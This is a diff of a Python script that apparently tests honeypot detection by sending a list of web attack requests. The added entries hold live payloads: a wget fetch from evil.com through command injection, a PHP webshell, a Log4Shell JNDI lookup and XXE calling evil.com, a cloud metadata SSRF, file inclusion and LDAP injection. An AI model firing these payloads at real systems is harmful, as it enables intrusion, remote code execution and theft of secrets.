@@ -14,7 +14,7 @@ VULNERABILITY_TESTS = [
     {
         "name": "SQL注入 (SQL Injection)",
         "method": "GET",
-        "path": "/product?id=1' OR '1'='1",
+        "path": "/product?id=1' UNION SELECT 1,2,3--",
         "headers": {},
         "data": None
     },
@@ -35,14 +35,14 @@ VULNERABILITY_TESTS = [
     {
         "name": "命令注入 (Command Injection)",
         "method": "GET",
-        "path": "/ping?ip=127.0.0.1; cat /etc/shadow",
+        "path": "/ping?ip=127.0.0.1; wget http://evil.com/shell.sh",
         "headers": {},
         "data": None
     },
     {
         "name": "敏感信息泄露 (Information Disclosure)",
         "method": "GET",
-        "path": "/config.bak",
+        "path": "/.env",
         "headers": {},
         "data": None
     },
@@ -50,15 +50,64 @@ VULNERABILITY_TESTS = [
         "name": "扫描探测 (Nmap 扫描)",
         "method": "GET",
         "path": "/",
-        "headers": {"User-Agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"},
+        "headers": {"User-Agent": "Mozilla/5.0 (compatible; nmap Scripting Engine; https://nmap.org/book/nse.html)"},
         "data": None
     },
     {
         "name": "WebShell 上传尝试",
         "method": "POST",
-        "path": "/upload",
+        "path": "/upload.php",
         "headers": {"Content-Type": "application/x-www-form-urlencoded"},
-        "data": {"file": "evil.php", "content": "<?php eval($_POST['cmd']); ?>"}
+        "data": {"file": "evil.php", "content": "<?php system($_POST['cmd']); ?>"}
+    },
+    {
+        "name": "远程代码执行 (RCE)",
+        "method": "POST",
+        "path": "/api/execute",
+        "headers": {"Content-Type": "application/json"},
+        "data": '{"query": "${jndi:ldap://evil.com/a}"}'
+    },
+    {
+        "name": "文件包含 (File Inclusion)",
+        "method": "GET",
+        "path": "/index.php?file=php://filter/read=convert.base64-encode/resource=index.php",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "SSRF尝试 (SSRF)",
+        "method": "GET",
+        "path": "/proxy?url=http://169.254.169.254/latest/meta-data/",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "XXE外部实体注入 (XXE)",
+        "method": "POST",
+        "path": "/xml-rpc",
+        "headers": {"Content-Type": "application/xml"},
+        "data": '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe;]>'
+    },
+    {
+        "name": "LDAP注入 (LDAP Injection)",
+        "method": "GET",
+        "path": "/login?user=admin)(|(objectClass=*)",
+        "headers": {},
+        "data": None
+    },
+    {
+        "name": "反序列化攻击 (Insecure Deserialization)",
+        "method": "POST",
+        "path": "/api/object",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": {"payload": "O:8:\"stdClass\":0:{}"}
+    },
+    {
+        "name": "CRLF注入 (CRLF Injection)",
+        "method": "GET",
+        "path": "/redirect?url=http://example.com%0d%0aSet-Cookie:session_id=123",
+        "headers": {},
+        "data": None
     }
 ]
 
@@ -77,12 +126,13 @@ def run_vulnerability_tests():
             # 备注：蜜罐返回 404 是正常现象，只要请求发出去且能被蜜罐后端捕获即可
             msg = " (正常, 攻击行为已被蜜罐记录)" if response.status_code == 404 else ""
             print(f"    [+] 状态码: {response.status_code}{msg}")
+            
+            time.sleep(0.5)
         except requests.exceptions.RequestException as e:
             print(f"    [!] 请求失败: {e}")
         except KeyboardInterrupt:
             print("\n[!] 用户手动中止测试")
             break
-        time.sleep(0.5)
 
 # ==========================================
 # 2. 暴力破解测试
@@ -107,15 +157,15 @@ def run_brute_force_test(attempts=30):
             success_count += 1
             sys.stdout.write(f"\r    [+] 进度: {i}/{attempts} (状态: {response.status_code})")
             sys.stdout.flush()
+            
+            # 适当的微小延时，确保系统能处理完
+            time.sleep(0.1)
         except requests.exceptions.RequestException as e:
             print(f"\n    [!] 第 {i} 次请求失败: {e}")
             break
         except KeyboardInterrupt:
             print("\n[!] 暴力破解测试中途被手动中止")
             break
-            
-        # 适当的微小延时，确保系统能处理完
-        time.sleep(0.1)
 
     end_time = time.time()
     time_taken = end_time - start_time
